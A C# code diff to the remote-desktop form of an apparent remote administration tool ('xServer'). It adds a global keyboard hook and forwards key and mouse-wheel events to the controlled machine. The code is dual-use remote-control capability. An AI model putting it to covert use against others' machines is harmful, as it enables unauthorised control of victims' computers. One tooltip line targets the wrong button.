@@ -4,20 +4,25 @@ using System.Windows.Forms;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
 using xServer.Core.Utilities;
+using xServer.Core.MouseKeyHook;
 using xServer.Enums;
 
 namespace xServer.Forms
 {
+    //TODO: Register Hotkeys for WIN - and ALT-key combinations
     public partial class FrmRemoteDesktop : Form
     {
         public bool IsStarted { get; private set; }
         private readonly Client _connectClient;
         private bool _enableMouseInput;
+        private bool _enableKeyboardInput;
+        private IKeyboardMouseEvents _mEvents;
 
         public FrmRemoteDesktop(Client c)
         {
             _connectClient = c;
             _connectClient.Value.FrmRdp = this;
+            Subscribe(Hook.GlobalEvents());
             InitializeComponent();
         }
 
@@ -32,8 +37,26 @@ namespace xServer.Forms
             btnShow.Location = new Point(377, 0);
             btnShow.Left = (this.Width / 2) - (btnShow.Width / 2);
 
+            _enableKeyboardInput = false;
+
             if (_connectClient.Value != null)
                 new Core.Packets.ServerPackets.GetMonitors().Execute(_connectClient);
+        }
+
+        private void Subscribe(IKeyboardMouseEvents events)
+        {
+            _mEvents = events;
+            _mEvents.MouseWheel += MouseWheelEvent;
+            _mEvents.KeyDown += OnKeyDown;
+            _mEvents.KeyUp += OnKeyUp;
+        }
+
+        private void Unsubscribe()
+        {
+            if (_mEvents == null) return;
+            _mEvents.MouseWheel -= MouseWheelEvent;
+            _mEvents.KeyDown -= OnKeyDown;
+            _mEvents.KeyUp -= OnKeyUp;
         }
 
         public void AddMonitors(int monitors)
@@ -94,6 +117,8 @@ namespace xServer.Forms
                 picDesktop.Dispose();
             if (_connectClient.Value != null)
                 _connectClient.Value.FrmRdp = null;
+
+            Unsubscribe();
         }
 
         private void FrmRemoteDesktop_Resize(object sender, EventArgs e)
@@ -118,6 +143,8 @@ namespace xServer.Forms
             // Subscribe to the new frame counter.
             picDesktop.SetFrameUpdatedEvent(_frameCounter_FrameUpdated);
 
+            this.ActiveControl = picDesktop;
+
             new Core.Packets.ServerPackets.GetDesktop(barQuality.Value, cbMonitors.SelectedIndex).Execute(_connectClient);
         }
 
@@ -129,6 +156,8 @@ namespace xServer.Forms
 
             // Unsubscribe from the frame counter. It will be re-created when starting again.
             picDesktop.UnsetFrameUpdatedEvent(_frameCounter_FrameUpdated);
+
+            this.ActiveControl = picDesktop;
         }
 
         private void barQuality_Scroll(object sender, EventArgs e)
@@ -144,6 +173,8 @@ namespace xServer.Forms
                 lblQualityShow.Text += " (high)";
             else if (value >= 25)
                 lblQualityShow.Text += " (mid)";
+
+            this.ActiveControl = picDesktop;
         }
 
         private void btnMouse_Click(object sender, EventArgs e)
@@ -152,14 +183,36 @@ namespace xServer.Forms
             {
                 this.picDesktop.Cursor = Cursors.Default;
                 btnMouse.Image = Properties.Resources.mouse_delete;
+                toolTipButtons.SetToolTip(btnMouse, "Enable mouse input.");
                 _enableMouseInput = false;
             }
             else
             {
                 this.picDesktop.Cursor = Cursors.Hand;
                 btnMouse.Image = Properties.Resources.mouse_add;
+                toolTipButtons.SetToolTip(btnMouse, "Disable mouse input.");
                 _enableMouseInput = true;
             }
+
+            this.ActiveControl = picDesktop;
+        }
+
+        private void btnKeyboard_Click(object sender, EventArgs e)
+        {
+            if (_enableKeyboardInput)
+            {
+                btnKeyboard.Image = Properties.Resources.keyboard_delete;
+                toolTipButtons.SetToolTip(btnMouse, "Enable keyboard input.");
+                _enableKeyboardInput = false;
+            }
+            else
+            {
+                btnKeyboard.Image = Properties.Resources.keyboard_add;
+                toolTipButtons.SetToolTip(btnMouse, "Disable keyboard input.");
+                _enableKeyboardInput = true;
+            }
+
+            this.ActiveControl = picDesktop;
         }
 
         private int GetRemoteWidth(int localX)
@@ -174,7 +227,7 @@ namespace xServer.Forms
 
         private void picDesktop_MouseDown(object sender, MouseEventArgs e)
         {
-            if (picDesktop.Image != null && _enableMouseInput && !btnStart.Enabled)
+            if (picDesktop.Image != null && _enableMouseInput && IsStarted && this.ContainsFocus)
             {
                 int local_x = e.X;
                 int local_y = e.Y;
@@ -198,7 +251,7 @@ namespace xServer.Forms
 
         private void picDesktop_MouseUp(object sender, MouseEventArgs e)
         {
-            if (picDesktop.Image != null && _enableMouseInput && !btnStart.Enabled)
+            if (picDesktop.Image != null && _enableMouseInput && IsStarted && this.ContainsFocus)
             {
                 int local_x = e.X;
                 int local_y = e.Y;
@@ -222,7 +275,7 @@ namespace xServer.Forms
 
         private void picDesktop_MouseMove(object sender, MouseEventArgs e)
         {
-            if (picDesktop.Image != null && _enableMouseInput && !btnStart.Enabled)
+            if (picDesktop.Image != null && _enableMouseInput && IsStarted && this.ContainsFocus)
             {
                 int local_x = e.X;
                 int local_y = e.Y;
@@ -237,11 +290,39 @@ namespace xServer.Forms
             }
         }
 
+        private void MouseWheelEvent(object sender, MouseEventArgs e)
+        {
+            if (picDesktop.Image != null && _enableMouseInput && IsStarted && this.ContainsFocus)
+            {
+                if (_connectClient != null)
+                    new Core.Packets.ServerPackets.DoMouseEvent(e.Delta == 120 ? MouseAction.ScrollUp : MouseAction.ScrollDown, false, 0, 0, cbMonitors.SelectedIndex).Execute(_connectClient);
+            }
+        }
+
+        private void OnKeyDown(object sender, KeyEventArgs e)
+        {
+            if (picDesktop.Image != null && _enableKeyboardInput && IsStarted && this.ContainsFocus)
+            {
+                if (_connectClient != null)
+                    new Core.Packets.ServerPackets.DoKeyboardEvent((byte)e.KeyCode, true).Execute(_connectClient);
+            }
+        }
+
+        private void OnKeyUp(object sender, KeyEventArgs e)
+        {
+            if (picDesktop.Image != null && _enableKeyboardInput && IsStarted && this.ContainsFocus)
+            {
+                if (_connectClient != null)
+                    new Core.Packets.ServerPackets.DoKeyboardEvent((byte)e.KeyCode, false).Execute(_connectClient);
+            }
+        }
+
         private void btnHide_Click(object sender, EventArgs e)
         {
             panelTop.Visible = false;
             btnShow.Visible = true;
             btnHide.Visible = false;
+            this.ActiveControl = picDesktop;
         }
 
         private void btnShow_Click(object sender, EventArgs e)
@@ -249,6 +330,7 @@ namespace xServer.Forms
             panelTop.Visible = true;
             btnShow.Visible = false;
             btnHide.Visible = true;
+            this.ActiveControl = picDesktop;
         }
     }
 }
